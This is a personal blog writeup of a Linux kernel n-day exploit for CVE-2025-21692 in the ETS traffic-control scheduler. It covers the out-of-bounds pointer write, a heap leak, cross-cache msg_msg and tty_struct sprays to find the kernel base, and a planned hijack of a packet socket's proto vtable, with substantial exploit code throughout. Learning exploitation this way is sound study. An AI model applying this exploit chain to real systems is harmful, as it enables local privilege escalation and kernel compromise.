---
title:  "CVE-2025-21692 nday writeup"
layout: post
categories: media
---

# Intro

Hi again. Been a minute. 
I've been a perpetual novice in the realm of kernel exploitation for far too long, besides a few older CTF challenges I'm almost completely bereft of experience in this area, so I finally decided to start studying some ndays.

I ended up picking a couple bugs, first, a VSOCK UAF - CVE-2025-21756. I chose this to study as it had a (really good, thanks Hoefler) accompanying blog post which I could follow through with and fall back on when I got stuck. I ended up trying to exploit this bug in a different way than was performed in [Hoefler's post](https://hoefler.dev/articles/vsock.html) to test myself. Instead of using pipes, I wanted to use `msg_msg`. 

This added another layer of difficulty which in turn demanded the use of another bug, [CVE-2025-21692](https://nvd.nist.gov/vuln/detail/CVE-2025-21692). This was definitely the most educational part of the process as there was no public exploit for this bug, except a few pocs [demonstrating](https://github.com/Bam0x7/linux-kernel-cve-exploit/blob/main/CVE-2025-21692/poc.c) it. I ended up leveraging these bugs together initially, but decided to write an exploit using only 21692.

In this post I'll go over the process I went through turning this bug into a valuable write primitive, then turning that into RCE. I'll go over stuff I learned, and difficulties encountered along the way.


    attr->nla_len = NLA_HDRLEN + 1;
    *(uint8_t *)(&attr[1]) = start_band;
    priomap->nla_len += NLA_ALIGN(attr->nla_len);
    attr = (struct nlattr *)((uint8_t *)(attr) + NLA_ALIGN(attr->nla_len));
    start_band--;
  }
  ```

What follows is the priomap for each band, simply a nested list of uint8. 
  
  ```c
  // [6]
  totlen += NLA_ALIGN(priomap->nla_len);
  options->nla_len = NLA_ALIGN(totlen);
  memcpy(NLMSG_DATA(nlh) + NLMSG_ALIGN(sizeof(tc)), buf, sizeof(buf));
  // ...
```

Finally we make sure the total length is correct and we are ready to go! Copying the data into the nlmsg payload after the tcmsg. This then gets sent away to the kernel. All netlink communications we do follow this pattern, seems easy, but oh my god did I have trouble getting the sizes and alignment right, hence the extremely ugly pointer arithmetic - skill issue.

### That's what I call REAL Quantum Computing

After the qdisc is added, triggering the bug is also quite simple. Sending a `nlmsg` of type `RTM_NEWTCLASS` and flags `NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ECHO` (see `get_quant` function in the exploit) leads us down the following call chain to `ets_class_change`.

```
netlink_sendmsg
	netlink_unicast
		rtnetlink_rcv
			netlink_rcv_skb
				rtnetlink_rcv_msg
					tc_ctl_tclass
						ets_class_change
```

Here the buggy utility function makes an appearance at [1]:
```c
static int ets_class_change(struct Qdisc *sch, u32 classid, u32 parentid,
			    struct nlattr **tca, unsigned long *arg,
			    struct netlink_ext_ack *extack)
{
	// [1]
	struct ets_class *cl = ets_class_from_arg(sch, *arg);
	struct ets_sched *q = qdisc_priv(sch);
	struct nlattr *opt = tca[TCA_OPTIONS];
	struct nlattr *tb[TCA_ETS_MAX + 1];
	unsigned int quantum;
	int err;

	/* Classes can be added and removed only through Qdisc_ops.change
	 * interface.
	 */
	if (!cl) {
		NL_SET_ERR_MSG(extack, "Fine-grained class addition and removal is not supported");
		return -EOPNOTSUPP;
	}

	if (!opt) {
		NL_SET_ERR_MSG(extack, "ETS options are required for this operation");
		return -EINVAL;
	}

	err = nla_parse_nested(tb, TCA_ETS_MAX, opt, ets_class_policy, extack);
	if (err < 0)
		return err;

	if (!tb[TCA_ETS_QUANTA_BAND])
		/* Nothing to configure. */
		return 0;

	if (ets_class_is_strict(q, cl)) {
		NL_SET_ERR_MSG(extack, "Strict bands do not have a configurable quantum");
		return -EINVAL;
	}

	err = ets_quantum_parse(sch, tb[TCA_ETS_QUANTA_BAND], &quantum,
				extack);
	if (err)
		return err;

	sch_tree_lock(sch);
	// [2]
	cl->quantum = quantum;
	sch_tree_unlock(sch);

	ets_offload_change(sch);
	return 0;
}
```

You may have already identified and flagged [2]. Indeed, __quant__ my beloved is back. Writing this here onto the underflowed class could be quite... Good? Depending on what `cl->quantum` overlaps with. So if we underflow `q->classes`, what do we actually end up accessing? Lets see the `struct ets_sched` qdisc structure where `classes` is contained.

```c
/* offset      |    size */  type = struct ets_sched {
/*      0      |      16 */    struct list_head {
/*      0      |       8 */        struct list_head *next;
/*      8      |       8 */        struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } active;
/*     16      |       8 */    struct tcf_proto *filter_list;
/*     24      |       8 */    struct tcf_block *block;
/*     32      |       4 */    unsigned int nbands;
/*     36      |       4 */    unsigned int nstrict;
/*     40      |      16 */    u8 prio2band[16];
/* XXX  8-byte hole      */
/*     64      |    1280 */    struct ets_class classes[16];

                               /* total size (bytes): 1344 */
                             }
```

`sizeof(struct ets_class)` is 80 bytes, so that puts us exactly 16 bytes before the start of `ets_sched` (`ets_sched.classes` offset is 64 bytes). Looking at `ets_class` we can see...

```c
struct ets_class {
/*      0      |      16 */    struct list_head {
/*      0      |       8 */        struct list_head *next;
/*      8      |       8 */        struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } alist;
/*     16      |       8 */    struct Qdisc *qdisc;
/*     24      |       4 */    u32 quantum;
/*     28      |       4 */    u32 deficit;
/*     32      |      16 */    struct gnet_stats_basic_sync {
/*     32      |       8 */        u64_stats_t bytes;
/*     40      |       8 */        u64_stats_t packets;
/*     48      |       0 */        struct u64_stats_sync {
                                       <no data fields>

                                       /* total size (bytes):    0 */
                                   } syncp;

                                   /* total size (bytes):   16 */
                               } bstats;
/*     48      |      20 */    struct gnet_stats_queue {
/*     48      |       4 */        __u32 qlen;
/*     52      |       4 */        __u32 backlog;
/*     56      |       4 */        __u32 drops;
/*     60      |       4 */        __u32 requeues;
/*     64      |       4 */        __u32 overlimits;

                                   /* total size (bytes):   20 */
                               } qstats;
/* XXX 12-byte padding   */

                               /* total size (bytes):   80 */
                             }
```

`quantum` is at offset 24. `-16 + 24 = 8` so we are writing `quantum` to the lower 4 bytes of `active->next`. Sick. Even better news is that we control quant, as it is taken directly from our message. Next step: what does this `active` get used for and what sort of damage can we do with this?

## Speculating 

*insert image of L from death note here*

Theres quite a few directions this could go now, Ctrl+F for `active` in [the ets source file](https://elixir.bootlin.com/linux/v6.6.75/source/net/sched/sch_ets.c) and have some fun. My brain immediately beelined to the enqueuing and dequeuing process, and so we arrive at our inevitable destination.

```c
static int ets_qdisc_enqueue(struct sk_buff *skb, struct Qdisc *sch,
			     struct sk_buff **to_free)
{
	unsigned int len = qdisc_pkt_len(skb);
	struct ets_sched *q = qdisc_priv(sch);
	struct ets_class *cl;
	int err = 0;
	bool first;

	cl = ets_classify(skb, sch, &err);
	if (!cl) {
		if (err & __NET_XMIT_BYPASS)
			qdisc_qstats_drop(sch);
		__qdisc_drop(skb, to_free);
		return err;
	}

	first = !cl->qdisc->q.qlen;
	err = qdisc_enqueue(skb, cl->qdisc, to_free);
	if (unlikely(err != NET_XMIT_SUCCESS)) {
		if (net_xmit_drop_count(err)) {
			cl->qstats.drops++;
			qdisc_qstats_drop(sch);
		}
		return err;
	}
	
	// [1]
	if (first && !ets_class_is_strict(q, cl)) {
		list_add_tail(&cl->alist, &q->active);
		cl->deficit = cl->quantum;
	}

	sch->qstats.backlog += len;
	sch->q.qlen++;
	return err;
}
```

After classifying a packet we arrive at [1]. If our packet is the first to be enqueued on this class/band's qdisc, and the band isnt strict (normal bandwidth sharing band) we call into `list_add_tail` with our (potentially) corrupt `active->next`. So what it do? Briefly:

```c
// new = &cl->alist
// head = &q->active
static inline void list_add_tail(struct list_head *new, struct list_head *head)
{
	__list_add(new, head->prev, head);
}
// ...
// new = &cl->alist
// prev = q->active->prev
// next = &q->active
static inline void __list_add(struct list_head *new,
			      struct list_head *prev,
			      struct list_head *next)
{
	// [1]
	if (!__list_add_valid(new, prev, next))
		return;

	next->prev = new;
	new->next = next;
	new->prev = prev;
	// [2] prev->next = new
	WRITE_ONCE(prev->next, new);
}
```

I did end up having to recompile a kernel with list hardening (CONFIG_LIST_HARDENED + CONFIG_DEBUG_LIST) turned off so we dont get destroyed at [1] - my default ubuntu kernel config had this disabled so I generally mirrored most of the important stuff to my target. Anyway.

So basically we end up doing `active->prev->next = &cl->alist`, which is perfect for us (`active->prev==active` atp). Now, how do we trigger. Very very simple, just send a packet to the interface!

```c
// Just send a packet to localhost
void trigger_write() {
  int s = socket(AF_INET, SOCK_DGRAM, 0);
  struct sockaddr_in saddr = {0};
  saddr.sin_family = AF_INET;
  saddr.sin_port = 1234;
  inet_pton(AF_INET, "127.0.0.1", &saddr.sin_addr);
  sendto(s, "lol", 3, 0, &saddr, sizeof(saddr));
  close(s);
}
```

Port doesn't matter here, as long as its being sent in the vague direction of lo. Another use of this lets us write back the value of `cl->quantum` over netlink, so instead of overwriting it we can leak it first. Looking back at `ets_class_change` there's this check:

```c
	if (!tb[TCA_ETS_QUANTA_BAND])
		/* Nothing to configure. */
		return 0;
```

If we *don't* set `TCA_ETS_QUANTA_BAND` in the message attributes, we don't overwrite the quantum value. So where is this return gonna take us back to? The call to `ets_class_change` originates in `tc_ctl_tclass` [1].
```c
	// ...
	// [1]
	if (cops->change)
		err = cops->change(q, clid, portid, tca, &new_cl, extack);
	if (err == 0) {
		// [2]
		tclass_notify(net, skb, n, q, new_cl, RTM_NEWTCLASS, extack);
		/* We just create a new class, need to do reverse binding. */
		if (cl != new_cl)
			tc_bind_tclass(q, portid, clid, new_cl);
	}
	// ...
```

Given we return 0, we next call into [2]. `tclass_notify` isnt too important, just know it sends class data back to us over rtnetlink, whats more important is what fills in this data. `tc_fill_tclass` is called from inside `tclass_notify` where it constructs a `tcmsg` to send our way. As part of this we eventually dump some information about our class:

```c
	// ...
	if (nla_put_string(skb, TCA_KIND, q->ops->id))
		goto nla_put_failure;
	if (cl_ops->dump && cl_ops->dump(q, cl, skb, tcm) < 0)
		goto nla_put_failure;
	// ...
```

`cl_ops->dump` is `ets_class_dump` in this case. And of course, this fills in the `cl->quantum` value - aka 4 bytes of `active->next`.

```c
	// ...
	if (!ets_class_is_strict(q, cl)) {
		if (nla_put_u32(skb, TCA_ETS_QUANTA_BAND, cl->quantum))
			goto nla_put_failure;
	}
	// ...
```

So getting a kmalloc-2k leak is easy, all we need to do is rummage through the message we get to find it. And it doesnt matter that its only 4 lower bytes because __thats all we can write back into the pointer anyway__. 

So now we have that out of the way, how do we proceed? What primitives can be get from this?

## Sploit ideas

So we have a pretty decent primitive, we can write a pointer to our qdisc allocation in kmalloc-2k ANYWHERE in the kmalloc heap. Pretty decent starting point. However bcuz I am kernel exp noob this took an embarrassingly long time. The first problem to take care of is leaks, we already have kmalloc-2k, but we'll need kernel text and more heap leaks, ideally. My first strategy here was trying to abuse `ets_qdisc_dump`:

```c
static int ets_qdisc_dump(struct Qdisc *sch, struct sk_buff *skb)
{
	struct ets_sched *q = qdisc_priv(sch);
	struct nlattr *opts;
	struct nlattr *nest;
	int band;
	int prio;
	int err;

	// ...
	// [1]
	if (q->nbands > q->nstrict) {
		nest = nla_nest_start(skb, TCA_ETS_QUANTA);
		if (!nest)
			goto nla_err;
		// [2]
		for (band = q->nstrict; band < q->nbands; band++) {
			if (nla_put_u32(skb, TCA_ETS_QUANTA_BAND,
					q->classes[band].quantum))
				goto nla_err;
		}

		nla_nest_end(skb, nest);
	}

	// ...
	
	return nla_nest_end(skb, opts);

nla_err:
	nla_nest_cancel(skb, opts);
	return -EMSGSIZE;
}
```

Given we have a leak of the qdisc already, its feasible we can reliably write anywhere within it and its contained structures. If we were to write a pointer value into `nbands`, it would be treated as a massive value. Then when we try to dump the qdisc, we would be able to read as many `quantum` values as we want from adjacent memory [2]. This ended up working quite well for an old test exploit I made with a different bug, however I didnt end up using this due to some.... Complications that arose when writing to and around `nbands`.

I found that trying to delete or reset the qdisc state after corrupting nbands resulted in a crash, the culprits being `ets_qdisc_reset` and/or `ets_qdisc_destroy`.

```c
static void ets_qdisc_reset(struct Qdisc *sch)
{
	struct ets_sched *q = qdisc_priv(sch);
	int band;

	// [1]
	for (band = q->nstrict; band < q->nbands; band++) {
		if (q->classes[band].qdisc->q.qlen)
			list_del(&q->classes[band].alist);
	}
	for (band = 0; band < q->nbands; band++)
		qdisc_reset(q->classes[band].qdisc);
}

static void ets_qdisc_destroy(struct Qdisc *sch)
{
	struct ets_sched *q = qdisc_priv(sch);
	int band;

	ets_offload_destroy(sch);
	tcf_block_put(q->block);
	// [2]
	for (band = 0; band < q->nbands; band++)
		qdisc_put(q->classes[band].qdisc);
}
```

Both of these use `nbands` to free or delete or reset class qdiscs and the class `alist`s, and performing this OOB leads to a null deref in my experience. This is especially problematic because as we'll see soon a fundamental part of our write primitive involves resetting the qdisc state so we can pass the `first` check in `ets_qdisc_enqueue` and trigger the primitive. With no way (I found) to restore the nbands variable to its sane state I moved on to some other method that didn't require corrupting the qdisc - at least not anymore than we already do. That's not to say there isn't a way to do this using the corrupted nbands -- its used quite a bit, and it could be a good exercise if you're in a similar place to me and looking for a bug to POC.

### Far too many cross cache attacks

My next port of call as it appears to be for many a' exploit dev is cross cache. What if we were to write the `alist` ptr somewhere in memory, and then free the qdisc? Since the ptr still refers to the qdisc allocation this would cause a UAF (lol). So what can we do? This is something I especially struggled with due to the yawning abyss of possible approaches here: a qdisc comes from kmalloc-2k, and we have its address, so what do we do? Theres a... __teeny tiny lil__ amount of potential objects we can use, just enough to drive you absolutely insane. When in doubt, cross cache in to a cg cache, baby.

I'll not explain cross cache here, but there's a lot of [really really great material](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#crossing-the-cache-boundary) that covers the process. I hate to banish you to another blog and lose you forever but give some of it a read and come back later (please). You'll thank me.

Doing this cross cache would upgrade our kmalloc-2k leak to a kmalloc-cg-2k leak. Using this we can do some funny stuff. One of the first things that occurred to me is writing our pointer into the `next` segment of a `msg_msg`. So the process would be:

- Add a qdisc, get a leak for this allocation
- Release and cross cache the qdisc page to cg-2k
- Add yet another qdisc
	- So we can use the write primitive
- Write the pointer into one of the `msg_msg->next` from our cross cache spray.
- Receive the message.
- Profit???

It wasn't gonna be that easy, though. Given the properties of `alist` and the current state of the qdisc, the pointer we write just points to itself. So even if we `MSG_COPY` a message (non-destructively fetching it from the queue rather than freeing it) we will still crash as `copy_msg` simply copies data while the `next` is populated. Bleh.

So the next idea I had was to release the other qdisc as well and replace that with another object, making the ptr written into `msg_msg->next` stale. Given the range of possibilities with kmalloc-2k this again kind of drove me insane. So... Cross cache party time again? I cant really say my exploit is optimal as it probably would've been easier to systematically search for an object in 2k which contains a kernel image ptr and NOT cross cache again, but I aint changing it now :P. Good luck.

### Struct'ive feedback

I'm just putting whatever the hell I want as the section headers now. Mhm.

So what did I have in mind? `tty_struct`s. This is [pretty well documented](https://github.com/smallkirby/kernelpwn/blob/master/technique/tty_struct.md), but the gist is they have some juicy pointers in we can use to get the kernel base address. `sizeof(struct tty_struct)` is 0x290 (656), so these will go squarely in the kmalloc-cg-1k cache. One small problem with this is we cant really cross cache spray to reclaim our page with `tty_struct` as there seems to be a pretty sensible (god i know) limit on the amount of these we can allocate. Solution? Spray `msg_msg` instead, of course. There's not a single problem that cant be solved with excessive spraying of `msg_msg`.

The idea is:
1. Create another qdisc, get leaks from it (again)
2. Spray `msg_msg` to get the slab where our controlled msg segment was
	- Now we entirely control the `next` segment of the original message with arbitrary data
3. Loop through the sprayed messages until the received (`MSG_COPY`d, of course) data in the `next` segment matches what we sprayed in 2.
	- Now we've found our controlled message
4. Free the controlled message
5. Spray `tty_struct`s
6. With any luck, the `next` segment ptr of our old `msg_msg` now points into a `tty_struct`.

This worked pretty well for the most part - excluding an alarming caveat that came later on. The code for this spraying and reclaiming follows.

```c
  // Writing the pointer and stuff...
  // ...
  for (i = 0; i < MSG_SPRAY / 2; i++) {
    // Release and immediately reclaim the messages we are sending.
    // This means when we break we free the correct msg and can then
    // just grab it and do whatever we want with it being free.
    mrecv = recv_msg(qid[i], COMP_SZ_MAX, 0, 0);
    if (mrecv[8 + 1] != '\x41') {
      printf("[!] Found: %d....\n", i);
      dumph(mrecv + 8, 0x8, ' ');
      qdisc_ptr_leak = *(uint64_t *)(&mrecv[8]);
      break;
    }
    send_msg(qid[i], COMP_SZ_MAX, msg, i + 1);
    free(mrecv);
  }

  if (!qdisc_ptr_leak) {
    // We will likely just crash here regardless lol
    printf("[!] Cross cache failed lol. Retry\n");
    return;
  }
  free(mrecv);

  // ...
  
  // Hit the `next` ptr of controlled msg
  do_ptr_write(idx, quant - 0x180 + 0x20, 1, sock_fd, &dest_addr);
  
  // ...
  // Cross cache stuff
  // ...
  
  // Need to be able to identify each msg
  {
    int msgsz = NEW_SPRAY_SZ;
    char *msgtxt = msg1;
    int spray_n = MSG_SPRAY * 2;
    int *qstore = qid1;
    int qidn = 0;
    int ret = -1;
    socklen_t len = 0;
    char mbuf[msgsz + MSGSZ];
    struct msgbuf *msg = (struct msgbuf *)mbuf;
    msgsz -= (MSGSZ);
    memcpy(msg->mtext, msgtxt, msgsz);
    for (int j = 0; j < spray_n; j++) {
      msg->mtype = MSG_SPRAY + j + 1;
      qidn = qstore[j];
      *(uint64_t *)(&msg->mtext[0x188 - 0x30]) = MSG_SPRAY + j + 1;
      if (msgsnd(qidn, msg, msgsz, 0) < 0) {
        printf("j: %d\tqid: %d\tmsgsz: 0x%x\n", j, qidn, msgsz);
        perror("msgsnd lol");
        exit(-1);
      }
    }
  }

  printf("[!] Receiving...");
  char *mrecv1 = recv_msg_CPY(qid[i], NEWCOMPSZ, 1, 0);
  uint64_t seg_idx = *(uint64_t *)(&mrecv1[MSGMSGSZ + 8]);

  printf("[*] Controlled seg idx: 0x%lx -> 0x%lx\n", seg_idx,
         seg_idx - (MSG_SPRAY + 1));

  seg_idx -= (MSG_SPRAY + 1);
  free(mrecv1);
  mrecv1 = recv_msg(qid1[seg_idx], NEW_SPRAY_SZ, 0, 0);
  dumph(mrecv1, 0x10, ' ');
  free(mrecv1);

  // Need moar raaaagh
  int spray_socks[0x200 - 4 - 1 + 0x50];
  for (int i = 0; i < sizeof(spray_socks) / sizeof(spray_socks[0]); i++) {
    if ((spray_socks[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY)) <= 2) {
      printf("i: %d\n", i);
      perror("tty_struct spray open");
      exit(-1);
    }
  }

  mrecv1 = recv_msg_CPY(qid[i], NEWCOMPSZ, 1, 0);
  const int subtract = (5 * 0x10) - 8;
  dumph(&mrecv1[NEWCOMPSZ - (subtract)], subtract, ' ');
  uint64_t do_tty_hangup = *(uint64_t *)(&mrecv1[NEWCOMPSZ - (subtract)]);
  kbase = do_tty_hangup - 0xadde80;
  printf("[*] Kbase: %p\n", kbase);
  free(mrecv1);

```

We end up embedding the `seg_idx` of the controlled message into the message itself so we know exactly which message it is, which we then release.

Very VERY luckily the `tty_struct` data overlapping `next->next` was null, otherwise this wouldn't have worked at all. That's become a theme with this exploit I feel. So with leaks acquired what comes next? Time travel, of course. The issue now is we wrote a single pointer, overwriting the `next` ptr of an old `msg_msg`, however in order to do more with this primitive we would need to re-do the whole process again, from the qdisc allocation to the cross cache and subsequent spraying to control the backing data this would all be quite annoying.

My idea ended up being to write our pointer value twice, once in `msg_msg`, and another in a very different location.

### PF_PACKET and other miracles

The object I had chosen to spray throughout the exploit was sockets -- not without good reason as they are quite bountiful (much more so than `tty_struct`). Some sockets, like `PF_NETLINK` end up in kmalloc-2k when allocated, however most don't. Many sockets have their own dedicated cache - for example AF_UNIX goes into the `UNIX` cache, `AF_VSOCK`, of course, goes into `AF_VSOCK`. I ended up deciding to target socket objects for achieving code execution as I had previously written an exploit following [hoefler's vsock post](https://hoefler.dev/articles/vsock.html) and it had been a very smooth process. But for this to work I would need to reliably know the location of a socket object, so ideally it would have to land in kmalloc-2k - in range of our qdisc.

Enter stage right, `PF_PACKET`. This specific socket kind ends up in kmalloc-2k. So why and how can this object be leveraged for code execution? All `struct sock`s have a certain member, `skc_prot` (residing in `struct sock_common`). This essentially acts as a family specific vtable of functions for stuff you can do on that socket.

```c
/* offset      |    size */  type = struct proto {
/*      0      |       8 */    void (*close)(struct sock *, long);
/*      8      |       8 */    int (*pre_connect)(struct sock *, struct sockaddr *, int);
/*     16      |       8 */    int (*connect)(struct sock *, struct sockaddr *, int);
/*     24      |       8 */    int (*disconnect)(struct sock *, int);
/*     32      |       8 */    struct sock *(*accept)(struct sock *, int, int *, bool);
/*     40      |       8 */    int (*ioctl)(struct sock *, int, int *);
/*     48      |       8 */    int (*init)(struct sock *);
/*     56      |       8 */    void (*destroy)(struct sock *);
/*     64      |       8 */    void (*shutdown)(struct sock *, int);
/*     72      |       8 */    int (*setsockopt)(struct sock *, int, int, sockptr_t, unsigned int);
/*     80      |       8 */    int (*getsockopt)(struct sock *, int, int, char *, int *);
/*     88      |       8 */    void (*keepalive)(struct sock *, int);
/*     96      |       8 */    int (*compat_ioctl)(struct sock *, unsigned int, unsigned long);
/*    104      |       8 */    int (*sendmsg)(struct sock *, struct msghdr *, size_t);
/*    112      |       8 */    int (*recvmsg)(struct sock *, struct msghdr *, size_t, int, int *);
/*    120      |       8 */    void (*splice_eof)(struct socket *);
/*    128      |       8 */    int (*bind)(struct sock *, struct sockaddr *, int);
/*    136      |       8 */    int (*bind_add)(struct sock *, struct sockaddr *, int);
/*    144      |       8 */    int (*backlog_rcv)(struct sock *, struct sk_buff *);
/*    152      |       8 */    bool (*bpf_bypass_getsockopt)(int, int);
								// [1]
/*    160      |       8 */    void (*release_cb)(struct sock *);
/*    168      |       8 */    int (*hash)(struct sock *);
/*    176      |       8 */    void (*unhash)(struct sock *);
/*    184      |       8 */    void (*rehash)(struct sock *);
/*    192      |       8 */    int (*get_port)(struct sock *, unsigned short);
/*    200      |       8 */    void (*put_port)(struct sock *);
/*    208      |       8 */    int (*psock_update_sk_prot)(struct sock *, struct sk_psock *, bool);
/*    216      |       4 */    unsigned int inuse_idx;
/* XXX  4-byte hole      */
// IRRELEVENT STUFF
/*    448      |       8 */    int (*diag_destroy)(struct sock *, int);

                               /* total size (bytes):  456 */
                             }
```

Sidenote god I love pahole so much.

The `release_cb` member of this structure is used (shocker incoming) when releasing the socket. It takes care of family specific destruction. So if you invoke `close(my_sock_xd);` this may call `release_cb`. The reason I say *may* is because when I tried this with netlink sockets there was absolutely nothing, so its not guaranteed, other destruction stuff may be used -- another reason why packet sockets are cool. So... What you're saying is there's a vtable... And we can write a pointer... And this pointer can be backed by entirely user controlled data (bcuz kmalloc-cg-1k)... Hmmm.....

Why the hell did libc have to go and start validating IO vtables man why cant everything be as easy as this.
										*_codecvt will remember that*

